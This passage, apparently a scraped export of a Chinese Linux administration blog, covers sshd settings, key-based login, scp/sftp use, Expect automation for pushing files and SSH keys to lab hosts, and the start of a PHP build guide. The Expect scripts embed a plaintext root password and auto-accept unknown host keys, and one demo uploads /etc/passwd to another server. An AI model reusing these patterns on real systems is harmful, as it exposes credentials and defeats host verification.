是否允许使用基于密码的认证。默认为\u0026quot;yes\u0026quot;。 PermitEmptyPasswords 是否允许密码为空的用户远程登录。默认为\u0026quot;no\u0026quot;。 UseDNS 指定 sshd是否应该对远程主机名进行反向解析，以检查此主机名是否与其IP地址真实对应。默认值为\u0026quot;yes\u0026quot;。。 PidFile 指定在哪个文件中存放SSH守护进程的进程号，默认为/var/run/sshd.pid。文件。 MaxStartups 最大允许保持多少个未认证的连接。默认值是 10 。到达限制后，将不再接受新连接，除非先前的连接认证成功或超出 LoginGraceTime 的限制。 SSH服务的认证类型 从ssh客户端来看，SSH服务主要提供两种级别的安全验证，具体级别如下：\n基于口令的安全验证 基于口令的安全验证是大家一直用的，只要知道服务器的SSH连接账号和口令（对应的服务器IP与开放的SSH端口，默认22），就可以通过ssh客户端登陆到这台远程主机。此时联机过程中所有传输的数据都是加密的。\n口令验证测试\n$ ssh -p52113 root@192.168.252.61 The authenticity of host '[192.168.252.61]:52113 ([192.168.252.61]:52113)' can't be established. RSA key fingerprint is 38:68:34:4e:09:c0:75:18:be:72:17:20:2c:95:0a:e6. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '[192.168.252.61]:52113' (RSA) to the list of known hosts. root@192.168.252.61's password: Last login: Thu May 11 21:37:33 2017 from 192.168.252.1 $ 基于秘钥的安全验证 基于秘钥的安全验证方式是指，需要依靠秘钥。也就是必须实现建立一对秘钥对，然后吧公用秘钥（public key）放在需要访问的目标服务器上，另外，还需要把私钥（private key）放到SSH客户端或对应的客户端服务器上。\n此时，如果想要连接到这个带有公用秘钥的SSH服务器，客户端SSH软件或客户端服务器就会向SSH服务器发出请求，请求用联机的用户秘钥进行安全验证。SSH服务器收到请求后，会先在该SSH服务器上连接的用户的家目录下寻找事先放上去的对应用户的公共密钥，然后把它和连接的SSH客户端发送过来的公用密钥进行比较。如果两个密钥一致，SSH服务器就用公用密钥加密“质询”（challenge）并把他发送给SSH客户端。\nSSH客户端收到“质询”之后就可以用自己的私钥解密，再把发送给SSH服务器。使用这种方式，需要使用联机用户的密钥文件。与第一种基于口令验证的方式相比，第二种方式不需要在网络上传送口令密码，所以安全性更高了，这时我们也要注意保护我们的密钥文件。特别是私钥文件，一旦被黑客获取，危险就大了。\n基于密钥的安全认证也有windows客户端与linux客户端的区别\nWINDOWS下使用秘钥方式登陆linux 方法一：在linux服务器上生成密钥对\n$ ssh-keygen -t dsa Generating public/private dsa key pair. # 输入文件中要保存的key Enter file in which to save the key (/root/.ssh/id_dsa): zhangsan # 输入一个要解密的密码，空为无密码 Enter passphrase (empty for no passphrase): # 再次输入密码，空为无密码 Enter same passphrase again: # 身份证明以保存至zhangsan这个文件 Your identification has been saved in zhangsan. # 公钥以保存为zhangsan.pub这个文件 Your public key has been saved in zhangsan.pub. # lamp主机的root用户的key的指纹为那些 The key fingerprint is: 10:d2:e8:03:30:4b:c9:8b:76:97:d0:6e:09:52:f7:06 root@lamp The key's randomart image is: +--[ DSA 1024]----+ |+oo.oE. | |.*.ooo+. | |o oo+ +o | |.o .o*.. | |. . o. S | | | | | | | | | +-----------------+ $ ls known_hosts zhangsan zhangsan.pub # 在服务器上将公钥重命名,名字错误将验证不成功 $ mv id_dsa.pub authorized_keys # 查看是否重命名成功 $ ll -rw-r--r--. 1 root root 599 Jun 17 03:23 authorized_keys -rw-------. 1 root root 668 Jun 17 03:23 id_dsa # 修改公钥权限 $ chmod 600 authorized_keys # 查看公钥权限是否修改成功 $ ll -rw-------. 1 root root 599 Jun 17 03:23 authorized_keys -rw-------. 1 root root 668 Jun 17 03:23 id_dsa 使用SecureCRT将私钥转换为openSSH格式的私钥\n选择之前下载的私钥的路径\n如果没输入密码则无这一步\n测试过程\n方法二：使用SecureCRT创建秘钥对\n选择当前要生成的秘钥窗口，然后点击“工具”中的创建公钥选项，如下图所示： 秘钥生成向导选择下一步，如下图所示： 秘钥类型选择DSA或RSA，然后点击下一步，如下图所示： 生成秘钥长度，保持默认即可，如下图所示： 秘钥生成过程，如下图所示： 秘钥生成后选择下一步，如下图所示： 秘钥生成后，点击下一步，选择秘钥的私钥保存的路径和，然后点击完成。如下图所示： 点击完成后，弹出是否使用此秘钥为全局公钥，以个人习惯选择是或否，这里选择否，如下图所示： 将SecureCRT生成的公钥上传到linux服务器上 # 创建公钥存放目录 $ mkdir .ssh # 修改.ssh目录的权限 $ chmod 700 .ssh/ # 查看ssh2兼容格式转换成openssh的格式结果 $ ssh-keygen -i -f Identity.pub ssh-dss AAAAB3NzaC1kc3MAAACBAIJLJsIZJ0G/RKBnWQ04uRfqnv3Vkm8iusrI3Bm784lP64kn/IVZnC/2wcs6xjwjuGFt8GgNVKty+ s5/jf4uMBse7Ju3alIv42iOmS5+qeztb3Yio1r0rEjLcEdFZVEW3dbVsYX3ufwvBa9GhPum4q3eYwY7TziKR9ub2UJZTqVzAAAAFQDSfk HVhjW7J80YBBI2PdqVcRfZ3wAAAIBwmHcLm+BVCcMmpKfYzl+W1/79Cd7vSbeFMW+linn82Li/RcVnWF47hxeKwOwJ/O2UJ879cW1xPUG nJUNfEvHJs93rn3zthlbwLCmyH8Ugp2pF38DgyydbU6Xs/6lyiUc14WlzvL3QqO1H+QBX/18ZgXsZjoxakd86pz329r9wTgAAAIAVakBN 8DtSRZqPLeaXDhevg3texOTlmDsmhmqBcAOmH6VnzP1VB0E8DhTB8/MWJChSJalslyEzaa1PhBNwZEn3SmG6vWe+CXSuEtHBXbVBQHsDb xois6L+oqkL86PA7JdzTDSfiZKoGOks5f37Qb+CREnhyYcXJIjPZTE/0aIsdA== # 将ssh2兼容格式转换成openssl的格式结果 $ ssh-keygen -i -f Identity.pub \u0026gt;\u0026gt;.ssh/authorized_keys # 修改公钥的权限 $ chmod 600 .ssh/authorized_keys # 查看权限是否修改成功 $ ll .ssh/ -rw-------. 1 root root 589 Jun 17 04:37 authorized_keys 测试结果 新建快速链接，在鉴权中选择公钥，如下图所示： 如果设置了通行短语，就会出现以下框\n裸奔的后果！一次ssh被篡改的入侵事件\n扫描端口实例：牤牛阵解决ssh安全问题\n$ nmap 192.168.65.62 -p1-65535 Starting Nmap 5.51 ( http://nmap.org ) at 2016-06-17 05:11 CST Nmap scan report for 192.168.65.62 Host is up (0.0000040s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3306/tcp open mysql Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds ","permalink":"https://www.oomkill.com/2016/08/ssh-service/","summary":"","title":"SSH服务详解"},{"content":"SSH客户端附带的远程拷贝scp命令 scp是加密 的远程拷贝，可以把数据从一台机器推送到另一台机器，也可以从其他服务器把数据拉回到本地执行命令的服务器，但是，每次都是全量拷贝（rsync增量拷贝），因此效率不高。 scp的基本语法使用 secure copy （remote file copy ）\n参数选项 注释说明 -p 拷贝前后保持文件或目录属性 -P （大写）\t接端口，默认22端口时可省略 -r 拷贝目录 -l 限制速度 推：scp -Pport 源 目标(user@host_ip):/path\n$ touch {a..f}.txt $ ls a.txt b.txt c.txt d.txt e.txt f.txt $ scp -P22 a.txt root@192.168.65.62:/ root@192.168.65.62's password: a.txt 100% 0 0.0KB/s 00:00 $ ls / app a.txt 拉：scp -Pport 源(user@host_ip):/path 目标\n$ ll / total 98 app a.txt $ ls $ scp -P22 root@192.168.65.62:/a.txt ./ -rw-r--r--. 1 root root 0 Jun 16 18:20 a.txt root@192.168.65.62's password: a.txt 100% 0 0.0KB/s 00:00 $ ls a.txt 拷贝目录\n$ touch {a..g}.txt $ ls a.txt b.txt c.txt d.txt e.txt f.txt g.txt $ scp -P22 -r /test1 root@192.168.65.62:/ root@192.168.65.62's password: c.txt 100% 0 0.0KB/s 00:00 b.txt 100% 0 0.0KB/s 00:00 g.txt 100% 0 0.0KB/s 00:00 e.txt 100% 0 0.0KB/s 00:00 a.txt 100% 0 0.0KB/s 00:00 d.txt 100% 0 0.0KB/s 00:00 f.txt 100% 0 0.0KB/s 00:00 $ l $ ll / drwxr-xr-x. 2 root root 4096 Jun 17 06:52 test1 SSH服务附带sftp功能服务 安全的FTP的功能，即通过ssh加密数据后进行传输\nLinux FTP客户端连接sftp服务器方法 linux客户端连接 sftp user@ip 如果端口为52113则登陆命令如下：\n$ sftp -oPort=22 root@192.168.65.62 Connecting to 192.168.65.62... root@192.168.65.62's password: # sftp默认的目录为用户家目录 sftp\u0026gt; ls -l Identity.pub anaconda-ks.cfg install.log install.log.syslog # 上传，默认上传到对方家目录 sftp\u0026gt; put /test/1 Uploading /test/1 to /root/1 /test/1 100% 0 0.0KB/s 00:00 $ ll -rw-r--r--. 1 root root 0 Jun 17 08:43 1 sftp\u0026gt; ls -l 1 Identity.pub anaconda-ks.cfg install.log install.log.syslog # sftp不支持tab键 sftp\u0026gt; cat 1 Invalid command. # 下载，默认下载到用户家目录 sftp\u0026gt; get install.log Fetching /root/install.log to install.log /root/install.log 100% 21KB 21.2KB/s 00:00 # sftp并不锁定目录，可以自行选择文件上传 # 把/etc/passwd从客户端本地传到sftp服务端指定目录/根下 sftp\u0026gt; put /etc/passwd / Uploading /etc/passwd to /passwd /etc/passwd 100% 1202 1.2KB/s 00:00 # lnmp长传自sftp服务器上的passwd文件 $ ll / -rw-r--r--. 1 root root 1202 Jun 17 08:51 passwd # sftp不能下载/上传目录 sftp\u0026gt; get asdc Fetching /root/asdc to asdc Cannot download non-regular file: /root/asdc 小结：\nsftp -oPort=22 root@1.1.1.1 上传put加客户端本地路径，也可以指定路径上传，put /etc/hosts(客户端目录) /tmp（服务器目录） 下载直接get服务端的内容，下载到本地的当前目录 windows客户端连接sftp方法 这时是windows连接的lnmp而和lamp无关，相当于rz sz上传下载的功能\n# 上传，路径要加双引号 sftp\u0026gt; put \u0026quot;D:\\vmware-0.log\u0026quot; Uploading vmware-0.log to /root/vmware-0.log 100% 193KB 193KB/s 00:00:00 D:/vmware-0.log: 197820 bytes transferred in 0 seconds (193 KB/s) sftp\u0026gt; ls anaconda-ks.cfg install.log install.log.syslog vmware-0.log 下载\nsftp\u0026gt; get install.log Downloading install.log from /root/install.log 100% 21KB 21KB/s 00:00:00 /root/install.log: 21682 bytes transferred in 0 seconds (21 KB/s) sftp\u0026gt; get install.log \u0026quot;D:\\\u0026quot; Downloading install.log from /root/install.log get: D:/: 系统找不到指定的文件。 100% 21KB 21KB/s 00:00:00 /root/install.log: 21682 bytes transferred in 0 seconds (21 KB/s) 下载的目录是CRT设置的目录，注意设置后需要重新启动软件\n","permalink":"https://www.oomkill.com/2016/07/scp/","summary":"","title":"使用SSH协议来传输文件"},{"content":"什么是Expect Expent是基于tcl的相对简单的一个免费的脚本编程工具语言，用来实现自动和交互任务程序进行通信，无需人的手工干预。比如SSH、FTP等，这些程序正常情况都需要手工与它们进行交互，而使用Expect就可以模拟人手工交互的过程，实现自动的和远程的程序交互，从而达到自动化运维的目的。\nExpect程序工作流程 Expect的工作流程可以理解为，spawn启动进程 ==\u0026gt; expect期待关键字 ==\u0026gt; send向进程发送字符 ==\u0026gt; 退出结束。\n安装Expect软件 首先，配置好yum安装源，并且确保机器可以上网，然后执行yum install expect -y即可安装Expect软件。\n安装完后查看结果：\n$ rpm -qa|grep expect\rexpect-5.44.1.15-5.el6_4.x86_64\r先看一个Expect小实例 首先准备3台虚拟机：\n192.168.252.60 client\r192.168.252.62 client\r192.168.252.63 client\r192.168.252.64 server\r再执行下面例子前，我们先手工执行如下命令\nssh -p52113 root@192.168.252.64 ifconfig\r执行结果：\n$ ssh -p52113 root@192.168.252.64 ifconfig\rroot@192.168.252.64's password: Expect 例子脚本内容：\n#!/usr/bin/expect\rspawn ssh -p52113 root@192.168.252.62 /sbin/ifconfig eth0\rset timeout 60\rexpect \u0026quot;*password:\u0026quot;\rsend \u0026quot;111111\\n\u0026quot;\rexpect eof\rexit\r执行结果：问题：\n$ ./a.exp spawn ssh -p52113 root@192.168.252.62 /sbin/ifconfig eth0\rroot@192.168.252.62's password: eth0 Link encap:Ethernet HWaddr 00:0C:29:C3:48:CB inet addr:192.168.252.62 Bcast:192.168.252.255 Mask:255.255.255.0\rinet6 addr: fe80::20c:29ff:fec3:48cb/64 Scope:Link\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:3027 errors:0 dropped:0 overruns:0 frame:0\rTX packets:1632 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1000 RX bytes:268416 (262.1 KiB) TX bytes:175473 (171.3 KiB)\r问题：\n$ ./a.exp ./a.exp: line 8: spawn: command not found\rcouldn't read file \u0026quot;*password:\u0026quot;: no such file or directory\r./a.exp: line 11: send: command not found\rcouldn't read file \u0026quot;eof\u0026quot;: no such file or directory\r原因：\n含有expect的脚本不能用bash执行，bash无法解析。添加可执行权限后，直接./your_script即可 这个代码是expect的代码，不由bash解释。 spawn可以看作expect脚本的内部函数。要第一行改成 #!/usr/bin/expect Expect语法 Expect中的命令是最重要的部分了，命令的使用语法如下：\n命令 [选项] 参数\rspawn spawn命令是Expect的初始命令，它用于启动一个进程，之后所有expect操作都在这个进程中进行，如果没有spawn语句，整个expect就无法执行了，spawn使用方法如下：\nspawn ssh root@192.168.252.62\r在spawn命令后面直接加上要启动的进程、命令等信息，除此之外，spawn还支持其他选项如：\n-open\t启动文件进程，具体说明省略。 -ignore\t忽略某些信号，具体说明省略。 expect 使用方法：\nexpect 表达式 动作 表达式 动作\rexpect命令用于等候一个相匹配内容的输出，一旦匹配上就执行expect后面的动作或命令。这个命令接受几个特有的参数，用的最多的就是-re，表示使用正则表达式的方式匹配，使用起来就像这样：\nspawn ssh root@192.168.252.64\rexpect \u0026quot;password:\u0026quot; {send \u0026quot;111111\\r\u0026quot;}\r从上面的例子可以看出，expect是依附与spawn命令的，当执行ssh命令后，expect就匹配命令执行后的关键字：“password：”，如果匹配到关键字就会执行后面包含在“{}”中的send或exp_send动作，匹配的动作可以放在二行，这样就不需要使用“{}”了，就像下面这样，实际完成的功能与上面是一样的：\nspawn ssh root@192.168.252.64\rexpect \u0026quot;password:\u0026quot; send \u0026quot;111111\\r\u0026quot;\rexpect命令还有一种用法，他可以在一个expect匹配中多次匹配关键字，并给出处理动作，只需要将关键字放在一个大括号中就可以了，当然还要有exp_continue。\nspawn ssh root@192.168.252.64\rexpect {\r\u0026quot;yes/no\u0026quot;\t{ exp_send \u0026quot;yes\\r\u0026quot;; exp_continue }\r\u0026quot;*password:\u0026quot;\t{ exp_send \u0026quot;111111\\r\u0026quot; }\r}\rexp_send和send 在上面的介绍中，我们已经看到exp_send命令的使用，exp_send命令是expect中的动作命令，它还有一个完成同样工作的同胞：send，exp_send命令可以发送一些特殊符号，我们看到了\\r（回车），还有一些其他的比如：\\n、\\t等等，这些都与TCL中的特殊符号相同。\nspawn ssh root@192.168.252.64\rexpect {\r\u0026quot;yes/no\u0026quot;\t{ exp_send \u0026quot;yes\\r\u0026quot;; exp_continue }\r\u0026quot;*password:\u0026quot;\t{ exp_send \u0026quot;111111\\r\u0026quot; }\r}\rsend命令有几个可用参数：\n-i 制定spawn_id，这个参数用来向不同spawn_id的进程发送命令，是进行多程序控制的关键参数。 -s s代表slowly，也就是控制发送的速度，这个参数使用的时候要与expect中的变量send_slow相关联。 exp_continue 这个命令一般用在动作中，它被使用的条件比较苛刻，看看下面的例子：\n#!/usr/bin/expect\rspawn ssh root@192.168.252.64 /sbin/ifconfig eth0\rset timeout 60\rexpect {\r-timeout 1\r\u0026quot;yes/no\u0026quot;\t{ exp_send \u0026quot;yes\\r\u0026quot;; exp_continue }\r\u0026quot;*password:\u0026quot;\t{ exp_send \u0026quot;111111\\r\u0026quot; }\rtimeout { puts \u0026quot;expect was timeout by oldboy.\u0026quot;; return}\r}\rexpect eof\rexit\r在这个例子中，可以发现exp_continue命令的使用方法，首先它要处于一个expect命令中，然后它属于一种动作命令，完成的工作就是从头开始遍历，也就是说如果没有这个命令，匹配第一个关键字以后就会继续匹配第二个关键字，但有了这个命令后，匹配第一个关键字以后，第二次匹配仍然从第一个关键字开始。\nsend_user send_user命令用来把后面的参数输出到标准输出中去，默认的send、exp_send命令都是将参数输出到程序中去的，用起来就像这样：\nsend_user \u0026quot;please input password:\u0026quot;\r这个语句就可以在标准输出中打印Please input password：字符了。\n#!/usr/bin/expect\rif { $argc != 2 } {\rsend_user \u0026quot;usage: expect scp-expect.exp file host dir\\n\u0026quot;\rexit\r}\r#define var\rset file [lindex $argv 0]\rset host [lindex $argv 1]\rset password \u0026quot;111111\u0026quot;\r#spawn scp /etc/hosts root@10.0.0.142:/etc/hosts\rspawn ssh-copy-id -i $file \u0026quot;-p 52113 root@$host\u0026quot;\rexpect {\r\u0026quot;yes/no\u0026quot; {send \u0026quot;yes\\r\u0026quot;;exp_continue}\r\u0026quot;*password\u0026quot; {send \u0026quot;$password\\r\u0026quot;}\r}\rexpect eof\rexit -onexit {\rsend_user \u0026quot;Oldboy say good bye to you!\\n\u0026quot;\r}\r#script usage\r#expect oldboy-6.exp file host dir\r#example\r#./oldboy-6.exp /etc/hosts 10.0.0.179 /etc/hosts\rexit exit命令功能很简单，就是直接退出脚本，但是你可以利用这个命令对脚本做一些扫尾工作，比如下面这样：\nexit -onexit {\rexec rm $tmpfile\rsend_user \u0026quot;Good bye\\n\u0026quot;\r}\r#!/usr/bin/expect\rif { $argc != 2 } {\rsend_user \u0026quot;usage: expect scp-expect.exp file host dir\\n\u0026quot;\rexit\r}\r#define var\rset file [lindex $argv 0]\rset host [lindex $argv 1]\rset password \u0026quot;111111\u0026quot;\r#spawn scp /etc/hosts root@10.0.0.142:/etc/hosts\rspawn ssh-copy-id -i $file \u0026quot;-p 52113 root@$host\u0026quot;\rexpect {\r\u0026quot;yes/no\u0026quot; {send \u0026quot;yes\\r\u0026quot;;exp_continue}\r\u0026quot;*password\u0026quot; {send \u0026quot;$password\\r\u0026quot;}\r}\rexpect eof\rexit -onexit {\rsend_user \u0026quot;Oldboy say good bye to you!\\n\u0026quot;\r}\r#script usage\r#expect oldboy-6.exp file host dir\r#example\r#./oldboy-6.exp /etc/hosts 10.0.0.179 /etc/hosts\rExcept变量 expect中有很多有用的变量，它们使用方法与TCL语言中的变量相同，比如： set 变量名 变量名 # 设置变量的方法 set $变量名 # 读取变量的方法\n#define var\rset file [lindex $argv 0]\rset file [lindex $argv 1]\rset file [lindex $argv 2]\rset password \u0026quot;123456\u0026quot;\rExpect关键字 expect中的特殊关键字用于匹配过程，代表某些特殊含义或状态，一般用于expect族命令中不能在外面单独使用，也可以理解为事件，使用上类似于expect eof {}\neof eof (end-of-file)关键字用于匹配 结束符，比如文件的结束符、FTP传输停止等情况，在这个关键字后跟上动作来做进一步的控制，特别是FTP交互操作方面，它的动作很大。用一个例子来看看：\nspawn ftp anonymous@10.11.105.110\rexpect {\r\u0026quot;password:\u0026quot; {exp_send \u0026quot;who I’m I\u0026quot;}\reof {ftp connect close}\r}\rinteract { }\rtimeout timeout是expect中的一个重要变量，它是一个全局性的时间控制开关，你可以通过为这个变量赋值来规定整个expect操作时间，注意这个变量是服务于expect全局的，它不会纠缠于某一条命令，即使命令没有任何错误，到时见仍然会激活这个变量，但这个时间到达以后除了激活一个开关之外不会做其他的事情，如何处理是脚本编写人员的事情，看看它的实际使用方法：\nset timeout 60\rspawn ssh root@192.168.2.1\rexpect \u0026quot;password:\u0026quot; {send \u0026quot;word\\r\u0026quot;}\rexpect timeout { puts \u0026quot;Expect was timeout\u0026quot;; return }\r上面的处理中，首先将timeout变量设置为60秒，当出现问题的时候程序可能会停止下来，只要到60秒。就会激活下面的timeout动作，这里我们打印一个信息并且停止了脚步的运行\u0026ndash;你可以做更多其他的事情，看自己的意思。\n在另一种expect格式中，我们还有一种设置timeout变量的方法，看看下面的例子：\nspawn ssh root@192.168.1.1\rexpect {\r-timeout 60\r-re \u0026quot;password:\u0026quot; {exp_send \u0026quot;word\\r\u0026quot;}\r-re \u0026quot;TopsecOS#\u0026quot; { }\rtimeout { puts \u0026quot;Expect was timeout\u0026quot;; return }\r-re \u0026quot;TopsecOS#\u0026quot; { }\rtimeout { puts \u0026quot;Expecr was timeout\u0026quot;; return }\r}\r生产场景Expect实战 $ cat fenfa.exp\r#!/usr/bin/expect\rif { $argc != 3 } {\rsend_user \u0026quot;usage: expect scp-expect.exp file host dir\\n\u0026quot;\rexit\r}\r#define var\rset file [lindex $argv 0]\rset host [lindex $argv 1]\rset dir [lindex $argv 2]\rset password \u0026quot;111111\u0026quot;\rspawn scp -P 52113 -p $file root@$host:$dir\r#spawn ssh-copy-id -i $file \u0026quot;-p 52113 root@$host\u0026quot;\rexpect {\r\u0026quot;yes/no\u0026quot; {send \u0026quot;yes\\r\u0026quot;;exp_continue}\r\u0026quot;*password\u0026quot; {send \u0026quot;$password\\r\u0026quot;}\r}\rexpect eof\rexit -onexit {\rsend_user \u0026quot;Oldboy say good bye to you!\\n\u0026quot;\r}\r#script usage\r#expect oldboy-6.exp file host dir\r#example\r#./oldboy-6.exp /etc/hosts 10.0.0.179 /etc/hosts\r实战1：使用expect实现批量分发/etc/hosts文件 $ cat hosts.sh #!/bin/sh\r. /etc/init.d/functions\rfor ip in 192.168.252.60 192.168.252.64 192.168.252.62\rdo\rexpect fenfa.exp /etc/hosts/ $ip ~/ \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\rif [ $? -eq 0 ];then\raction \u0026quot;$ip\u0026quot; /bin/true\relse action \u0026quot;$ip\u0026quot; /bin/false\rfi\rdone\r如果ip很多写循环列表\nfor ip in `cat ip_list`\r测试结果：\n$ sh hosts.sh 192.168.252.60 [确定]\r192.168.252.64 [确定]\r192.168.252.62 [确定]\r实战2：使用expect批量分发SSH密钥文件 首先准备4台机器：\nIP hostname- 192.168.252.60 lamp_client 192.168.252.62 rsync_client 192.168.252.63 nfs_server 192.168.252.64 mysql_client 1 在server端创建公钥与私钥\n$ ssh-keygen -t dsa\rGenerating public/private dsa key pair.\rEnter file in which to save the key (/root/.ssh/id_dsa): Created directory '/root/.ssh'.\rEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /root/.ssh/id_dsa.\rYour public key has been saved in /root/.ssh/id_dsa.pub.\rThe key fingerprint is:\r85:c5:f0:88:31:ed:a6:e6:9f:54:61:1e:68:ee:b2:c7 root@server-nfs\rThe key's randomart image is:\r+--[ DSA 1024]----+\r| o..o. |\r| +.*. |\r| ..= * |\r| oo+ o |\r| oS o |\r| o. . |\r| o..o |\r| .+E. |\r| .oo |\r+-----------------+\r2 查看密钥\n$ ll ~/.ssh/\rid_dsa\rid_dsa.pub\r3 写批量拷贝脚本\n#!/usr/bin/expect\rif { $argc != 2 } {\rsend_user \u0026quot;usage: expect scp-expect.exp file host dir\\n\u0026quot;\rexit\r}\r#define var\rset file [lindex $argv 0]\rset host [lindex $argv 1]\rset password \u0026quot;111111\u0026quot;\r#spawn scp /etc/hosts root@10.0.0.142:/etc/hosts\rspawn ssh-copy-id -i $file \u0026quot;-p 52113 root@$host\u0026quot;\rexpect {\r\u0026quot;yes/no\u0026quot; {send \u0026quot;yes\\r\u0026quot;;exp_continue}\r\u0026quot;*password\u0026quot; {send \u0026quot;$password\\r\u0026quot;}\r}\rexpect eof\rexit -onexit {\rsend_user \u0026quot;Oldboy say good bye to you!\\n\u0026quot;\r}\r#script usage\r#expect oldboy-6.exp file host dir\r#example\r#./oldboy-6.exp /etc/hosts 10.0.0.179 /etc/hosts\r$ ll ~/.ssh/\rauthorized_keys\r$ ll ~/.ssh/\rid_dsa\rid_dsa.pub\rknown_hosts\r$ ll ~/.ssh/\rauthorized_keys\r$ ll ~/.ssh/\rauthorized_keys\r$ ssh -p52113 root@192.168.252.60 ifconfig\reth0 Link encap:Ethernet HWaddr 00:0C:29:A7:DB:43 inet addr:192.168.252.60 Bcast:192.168.252.255 Mask:255.255.255.0\rinet6 addr: fe80::20c:29ff:fea7:db43/64 Scope:Link\rUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\rRX packets:1187 errors:0 dropped:0 overruns:0 frame:0\rTX packets:792 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:1000 RX bytes:105294 (102.8 KiB) TX bytes:73135 (71.4 KiB)\rlo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0\rinet6 addr: ::1/128 Scope:Host\rUP LOOPBACK RUNNING MTU:65536 Metric:1\rRX packets:40 errors:0 dropped:0 overruns:0 frame:0\rTX packets:40 errors:0 dropped:0 overruns:0 carrier:0\rcollisions:0 txqueuelen:0 RX bytes:3520 (3.4 KiB) TX bytes:3520 (3.4 KiB)\r大功告成。\n特别提示：如果是禁止了ROOT远程连接，那么就使用普通用户加sudo的方式结合在expect大量分发。有的同学们问，既然做密钥认证了，为什么还要expect分发呢。在做认证期间，第一次的密钥分发，如果机器数量多，比如1000台，就可以expect分发，比ssh-copy-id方式或http的方式都会好一点。\n当然从例一可以看出来，即使不用密钥认证，expect依然可以实现分发数据及文件及批量管理部署服务。\n","permalink":"https://www.oomkill.com/2016/07/expect/","summary":"","title":"expect使用案例"},{"content":"下载PHP 台湾镜像站：http://ftp.ntu.edu.tw/php/distributions/ 搜狐镜像站：http://mirrors.sohu.com/php/ 阿里镜像：http://mirrors.aliyun.com/ 官网：http://php.net/downloads.php 检查PHP所需的lib库 rpm -qa \\\rzlib-devel \\\rlibxml2-devel \\\rlibjpeg-devel \\\rlibjpeg-turbo-devel \\\rlibiconv-devel \\\rfreetype-devel \\\rlibpng-devel \\\rgd-devel \\\rlibcurl-devel \\\rlibxslt-devel\r提示：libjpeg-turbo-devel是早期libjpeg-devel的新名字，libcurl-devel是早期curl的新名字。\n每个lib一般都会存在对应的以“-devel”命名的包，安装lib对应的-devel包后，对应的lib包就会自动安装好，例如安装gd-devel时就会安装gd。\n这些lib库不是必须安装的，但是目前的企业环境下一般都需要安装。否则，PHP程序运行时会出现问题，例如验证码无法显示等。\n执行下面命令安装相关的lib软件包：\nyum install -y \\\rzlib-devel \\\rlibxml2-devel \\\rlibjpeg-devel \\\rlibjpeg-turbo-devel \\\rfreetype-devel \\\rlibpng-devel \\\rgd-devel \\\rcurl-devel \\\rlibxslt-devel \\\rbzip2-devel \\\rgmp-devel \\\rreadline-devel\r提示：从安装上看，仅有libiconv-devel这个包没有安装，因为默认的yum源没有此包。可以一个一个地yum安装或通过源文件手工编译安装（这样效率慢）\n安装libiconv-devel libiconv下载地址：http://ftp.gnu.org/pub/gnu/libiconv/\n可以将libiconv制作成rpm包，批量安装时，可放至本地yum源内\n./configure --prefix=/usr/local/libiconv\rmake \u0026amp; make install\r安装epel源 可以安装redhat官方yum源里没有的软件，epel源和官方源不冲突\n阿里镜像 http://mirrors.aliyun.com/\nwget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo\rCentos7\nwget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo\r安装libmcrypt-devel 这是一个使用动态加载的模块化的libmcrypt。libmcrypt对于在程序运行时添加/移除算法是有用的。limbcrypt-nm目前不再被官方支持，其软件地址为http://mcrypt.hellug.gr/lib/，编译PHP的过程中，libmcrypt库不是必须要安装的包。\nyum install libmcrypt-devel -y\r# 安装成功后\rrpm -qa libmcrypt-devel\rlibmcrypt-devel-5.8-9.el6.x86_64\r安装mhash加密扩展库 mhash是基于离散数学原理不可逆向的PHP加密方式扩展库，其在默认情况下不会开启。mhash可以用于创建校验数值、消息摘要、消息认证码，以及无需原文的关键信息保存（如密码）等。它为PHP提供了多种散列算法，如MD5、SHA1、GOST等。可以通过MHASH_hashname()查看其支持的算法有哪些。\nyum install mhash -y\r安装mcrypt PHP程序员在编写代码程序时，除了要保证代码的高性能之外，还有一点是非常重要的，那就是程序的安全性保障。PHP除了自带的几种加密函数外，还有功能更全面的PHP加密扩展库mcrypt和mhash。 其中，mcrypt扩展库可以实现加密解密功能，就是既能将明文加密，也可以将密文还原。 可以说，mcrypt是PHP里面重要的加密支持扩展库，该库在默认情况下不开启。\nyum install mcrypt -y\ryum install mcrypt mhash libmcrypt-devel -y\r问：如果在不能联网的状态下怎么配置PHP环境？ 答：在yum时，可以在yum配置文件中设置安装后不删除包 vi /etc/yum.conf\n编译PHP 编译PHP参数详解 ./configure --prefix=/app/php-7. # \u0026lt;==指定PHP的安装目录\r--with-curl # \u0026lt;==打开PHP curl扩展\r--with-curlwrappers # \u0026lt;==curl工具打开url流的测试版，不建议开启\r--with-freetype-dir # \u0026lt;== 打开freetype字体库支持\r--with-gd # \u0026lt;==打开PHP GD库依赖\r--with-png-dir # \u0026lt;==\r--with-jpeg-dir # \u0026lt;==\r--enable-gd-native-ttf # \u0026lt;==打开PHP GD库ttf\r--with-gettext # \u0026lt;==打开PHP gettext库，多国语言时需要\r--with-iconv-dir=/usr/local/lib # \u0026lt;==打开PHP iconv字符集转换格式时需要\r--with-kerberos # \u0026lt;==PHP的一种加密方式 DES\r--with-libdir=lib64 # \u0026lt;==默认找/usr/lib下。64位需指定路径\r--with-libxml-dir # \u0026lt;==打开libxml2库的支持\r--enable-xml\r--enable-safe-mode # \u0026lt;==打开安全模式\r# 需要指定mysql的安装路径,安装PHP需要的MySQL相关内容。\r# 当然如果没有MySQL软件包，也可以不单独安装，\r# 这样的情况可使用--with-mysql=mysqlnd替代--with-mysql=/app/mysql\r# 因为PHP软件里面已经自带连接MySQL的客户端工具。PHP7遗弃\r--with-mysql=/app/mysql/\r--with-mysqli=/app/mysql/bin/mysql_config # \u0026lt;==使用PHP mysqli扩展\r--with-pdo-mysql # \u0026lt;==使用pdo mysql扩展 --with-pdo-sqlite # \u0026lt;==使用pdo sqlite扩展\r--with-openssl # 